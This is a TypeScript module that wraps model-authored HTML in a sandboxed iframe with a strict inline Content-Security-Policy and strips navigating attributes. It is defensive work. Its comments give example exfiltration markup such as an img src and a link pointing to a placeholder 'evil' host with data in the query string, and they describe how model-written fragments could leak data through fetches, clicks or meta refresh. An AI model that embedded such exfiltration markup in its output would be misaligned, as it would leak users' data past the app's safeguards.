/**
 * The document a model-authored HTML fragment is rendered inside.
 *
 * ## What `sandbox=""` actually does, measured against the spec rather than
 * assumed
 *
 * An empty `sandbox` attribute applies every restriction the flag list can
 * lift: no scripts, an opaque origin, no forms, no popups, no top-level
 * navigation, no plugins, no pointer lock, no modals. The comment this
 * replaces read "No scripts, no same-origin, no network", and two of those
 * three were right.
 *
 * Sandboxing says nothing about subresource loading. A sandboxed document
 * still fetches what its markup names — `<img src>`, `<link rel=stylesheet>`,
 * `<video>`, a CSS `url()`, `@font-face`, `<meta http-equiv=refresh>`. So the
 * exact channel closed for markdown in `ui/Markdown.tsx` was open here, on a
 * fragment the model wrote in full: `<img src="https://evil/?d=…">` inside
 * `render_html` is a GET the moment the disclosure is expanded, with no click
 * and no script.
 *
 * The document's own policy is what closes it, and it is inlined rather than
 * inherited. A `srcdoc` document is specified to inherit its parent's CSP, but
 * (a) the app's parent policy sets only `img-src`, so a stylesheet, a font or
 * a `connect-src` would have been unaffected, and (b) inheritance across an
 * opaque-origin sandbox is exactly the kind of thing that is true until a
 * browser version says otherwise. A policy in the document needs neither claim
 * to hold.
 *
 * `default-src 'none'` is the whole point: everything that has to be allowed
 * is then named explicitly, so a directive nobody thought of defaults to
 * refusal instead of to the network. `base-uri` and `form-action` are named
 * separately because neither falls back to `default-src`.
 */
const FRAME_CSP = [
  "default-src 'none'",
  // Inline CSS only — the fragment is told to inline its styles, and a
  // stylesheet URL is a request.
  "style-src 'unsafe-inline'",
  // Images the fragment carries itself. No scheme that leaves the device.
  'img-src data:',
  "base-uri 'none'",
  "form-action 'none'",
].join('; ');

/**
 * The one thing neither the sandbox nor the policy stops: a click.
 *
 * `sandbox=""` withholds `allow-top-navigation` and `allow-popups`, so the
 * fragment cannot navigate the app or open a window. It says nothing about the
 * frame navigating ITSELF, which is what a plain `<a href="https://evil/?d=…">`
 * does on click, with the default `_self` target. CSP has nothing to say about
 * it either: `navigate-to` was removed from the spec and never shipped, and
 * `default-src 'none'` governs fetches rather than navigations. So one click on
 * text the model chose was a GET to an origin the model chose, carrying
 * whatever it put in the query string — on web and on mobile, where the frame
 * is a real browsing context.
 *
 * `<meta http-equiv="refresh">` is the same channel without the click, and
 * `<form action>`/`formaction` is the same channel with a button on it.
 *
 * The rewrite is an ALLOWLIST over attribute values, not a scheme denylist:
 * anything that is not a same-document fragment survives as a `data-` copy the
 * reader can still see, and nothing else keeps its navigating attribute. It
 * runs on a parsed tree rather than over the string, because attribute
 * matching by regex is exactly the kind of thing a model gets to iterate
 * against.
 */
export function neutraliseNavigation(html: string): string {
  if (typeof DOMParser === 'undefined') {
    // Nothing here can parse, so nothing here can be trusted to have been
    // neutralised. Show the fragment as text rather than as a document.
    return escapeHtml(html);
  }

  const NAVIGATES = [
    'href',
    'xlink:href',
    'action',
    'formaction',
    'ping',
    'target',
    'download',
    'srcset',
    'src',
    'data',
    'poster',
    'background',
  ];

  const parsed = new DOMParser().parseFromString(html, 'text/html');

  for (const element of Array.from(parsed.querySelectorAll('base, meta[http-equiv]'))) {
    element.remove();
  }

  for (const element of Array.from(parsed.querySelectorAll('*'))) {
    for (const attribute of NAVIGATES) {
      const value = element.getAttribute(attribute);
      if (value === null) continue;
      if (attribute === 'href' && value.startsWith('#')) continue;
      if ((attribute === 'src' || attribute === 'poster') && value.startsWith('data:')) continue;
      element.removeAttribute(attribute);
      // Kept visible rather than deleted: the user can read where the model
      // wanted to send them, and can decide for themselves.
      element.setAttribute(`data-withheld-${attribute.replace(':', '-')}`, value);
    }
  }

  // Head as well as body: a bare `<style>` in the fragment is hoisted into
  // `<head>` by the parser, and returning only the body would silently discard
  // the model's CSS — a "safe" render_html that no longer renders anything.
  return parsed.head.innerHTML + parsed.body.innerHTML;
}

function escapeHtml(text: string): string {
  return text.replace(
    /[&<>"']/g,
    (character) =>
      ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[character] ?? character,
  );
}

/**
 * Wrap model-authored HTML in a document that cannot reach the network.
 *
 * The policy goes first, before any of the model's bytes. A `<meta>` CSP
 * governs only what follows it, so ordering is load-bearing rather than
 * stylistic — and a second policy the model adds cannot loosen this one:
 * multiple policies intersect, they do not override.
 */
export function frameDocument(html: string): string {
  return `<!doctype html><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${FRAME_CSP}">${neutraliseNavigation(html)}`;
}

/** Exported so a test can assert the policy rather than restate it. */
export const FRAME_CONTENT_SECURITY_POLICY = FRAME_CSP;
